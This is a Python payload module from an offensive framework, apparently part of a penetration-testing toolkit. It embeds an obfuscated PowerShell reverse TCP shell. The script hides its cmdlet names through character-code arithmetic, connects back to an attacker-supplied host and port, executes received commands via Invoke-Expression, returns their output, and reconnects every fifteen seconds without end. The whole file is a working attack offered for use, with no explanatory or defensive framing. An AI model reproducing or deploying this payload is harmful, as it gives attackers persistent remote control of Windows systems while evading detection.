# This module is part of the Blackjack framework

class Payload:

    info = {
        'Title' : 'Windows PowerShell Reverse TCP',
        'Author' : 'r0jahsm0ntar1',
        'Description' : 'Classic PowerShell Reverse TCP',
        'References' : ['https://github.com/r0jahsm0ntar1/africana-framework']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'powershell-reverse-tcp',
        'os' : 'windows'
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {
        'encode' : True
    }

    data = """
    do {
    $g9mUZ1Vrvz = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{$($_)}|%{ ( [char][int] $_)})) |%{$_}| % {$($_)}) $([char](25+83-25)+[char](115+121-115)+[char](48*115/48)+[char](14+116-14)+[char](67+101-67)+[char](14+109-14)+[char](77+46-77)+[char](15*78/15)+[char](47+101-47)+[char](0+116-0)+[char](89+46-89)+[char](68+83-68)+[char](0+111-0)+[char](15*99/15)+[char](55+107-55)+[char](80*101/80)+[char](52*116/52)+[char](98*115/98)+[char](29*46/29)+[char](72+84-72)+[char](0+67-0)+[char](90+80-90)+[char](0+67-0)+[char](23+108-23)+[char](117*105/117)+[char](32*101/32)+[char](11*110/11)+[char](35+116-35))('*LHOST*', *LPORT*)
    $hPAMk4Q9lENeLgUT2XRtj8xJz = $g9mUZ1Vrvz.GetStream()
    [byte[]] $DnFwvUAMP9p0qgLafT5idck = 0..65535 |%{$($_)}| & ([string]::join('', ( (70,111,114,69,97,99,104,45,79,98,106,101,99,116) |%{$($_)}|%{ ( [char][int] $_)})) |%{$($_)}| % {$_}) { 0 }

    while (($Nx1 = $hPAMk4Q9lENeLgUT2XRtj8xJz.Read($DnFwvUAMP9p0qgLafT5idck, 0, $DnFwvUAMP9p0qgLafT5idck.Length)) -ne 0) {
        $7HsSUGdpYkriwFLqQhAl = (& ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{$_}|%{ ( [char][int] $_)})) |%{$($_)}| % {$($_)}) -TypeName ([string]::join('', ( (83,121,115,116,101,109,46,84,101,120,116,46,65,83,67,73,73,69,110,99,111,100,105,110,103) |%{$_}|%{ ( [char][int] $_)})) |%{$_}| % {$_})).GetString($DnFwvUAMP9p0qgLafT5idck, 0, $Nx1)
        $k7iqSJnb6 = (& (("-LaPUA2bEm3pk9tf01gvSqlrIG6BwNdjc4VZsYCuXR8Jey57oKMWxniTzFQhHOD")[24,53,19,48,12,44,0,8,52,11,23,44,36,36,54,48,53] -join '') ". { $7HsSUGdpYkriwFLqQhAl } 2>&1" |%{$($_)}| & ([string]::join('', ( (79,117,116,45,83,116,114,105,110,103) |%{$($_)}|%{ ( [char][int] $_)})) |%{$($_)}| % {$_}))
        $TS5bJYV10mLNBKzpEc = $k7iqSJnb6 + 'PS ' + (& (("IF6MLa5HJU30E7kGuvNSwpThj8Yl9ZDcxqz2obArmi-Pyd4WfVCKtnQOsR1gBeX")[15,61,52,42,4,36,31,5,52,41,36,53] -join '')).Path + '> '
        $5fRrSIJ = ([text.encoding]::ASCII).GetBytes($TS5bJYV10mLNBKzpEc)
        $hPAMk4Q9lENeLgUT2XRtj8xJz.Write($5fRrSIJ, 0, $5fRrSIJ.Length)
        $hPAMk4Q9lENeLgUT2XRtj8xJz.Flush()
    }

    $g9mUZ1Vrvz.Close()
    & ([string]::join('', ( (83,116,97,114,116,45,83,108,101,101,112) |%{$($_)}|%{ ( [char][int] $($_))})) |%{$_}| % {$_}) -Seconds 15
} while ($true)
"""
